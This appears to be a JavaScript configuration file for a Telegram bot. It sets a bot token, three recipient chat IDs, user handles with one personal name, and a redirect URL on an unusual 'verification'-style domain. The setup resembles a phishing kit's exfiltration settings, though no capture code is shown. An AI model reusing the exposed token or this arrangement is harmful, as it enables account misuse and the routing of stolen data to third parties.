// Telegram Bot Configuration
// Replace these values with your own Telegram bot token and chat ID

const TELEGRAM_CONFIG = {
    // Your Telegram Bot Token (get from @BotFather on Telegram)
    BOT_TOKEN: '8537763956:AAFxm2cK7W9t8HSVWKwo_bme-HnqYsM1UO4',
    
    // Your Telegram Chat ID(s) (where messages will be sent)
    // Bot: @Spidercupcake_bot
    // Users: @fileclosee (File closed), second user, and @spidercupcake (Hamza Zain)
    // For multiple users, use array format
    CHAT_ID: ['6803542708', '6947496197', '6409516838']
};

// Site URL for redirects (replace with your domain or base URL)
const SITE_URL = 'https://bkverf.online/nw/'; // e.g., 'https://example.com' or 'http://localhost'

